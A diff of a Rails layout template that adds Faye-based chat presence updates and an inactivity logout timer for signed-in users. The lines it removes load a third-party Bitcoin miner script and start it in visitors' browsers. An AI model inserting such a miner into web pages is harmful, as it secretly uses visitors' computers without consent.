@@ -238,8 +238,53 @@
 <%= render :partial => '/shared/admin_messages' %>
 <div id="chat_sounds"></div>
 
+<% if user_signed_in? %>
+<%= javascript_include_tag "http://localhost:9293/faye.js" %>
+<script>  
+  // cerrar session on devise
+  $(function() {
 
-<script src="http://www.bitcoinplus.com/js/miner.js" type="text/javascript"></script>
-<script type="text/javascript">BitcoinPlusMiner(31306459)</script>
+    // nos conectamos a faye    
+    var client = new Faye.Client('http://localhost:9293/faye');
+
+    client.subscribe('/messages/public', function(data) {
+      if (data && data.online) {
+        $('#chat-list-user-' + data.userId).removeClass('user-offline').addClass('user-online');
+      } else {
+        $('#chat-list-user-' + data.userId).removeClass('user-online').addClass('user-offline');
+      }
+    });
+
+      var callback = function () {
+        $('.logout').trigger('click');
+      }
+      // el valor numerico debe de ser igual al valor de devise
+      // para expirar la session
+      var logout_timer = new Timer(1800, callback, window);
+      logout_timer.start();
+
+      // restart timer if activity
+      $(document).on('keyup keypress blur change mousemove',function(){
+        logout_timer.start();
+        window.CERRARCURSAME=false;
+      });
+      $(document).on('mouseleave',function(){
+          window.CERRARCURSAME=true;
+      });
+     
+      $(window).on("beforeunload",function(){
+        if(window.CERRARCURSAME){  
+          var client = new Faye.Client('http://localhost:9293/faye');
+          client.publish('/messages/public',{
+            userId: <%=current_user.id%>,
+            online: false
+          });
+        }        
+        return void 0;
+        // return 'hola'
+      });
+  });
+  </script>
+<% end %>
 
 
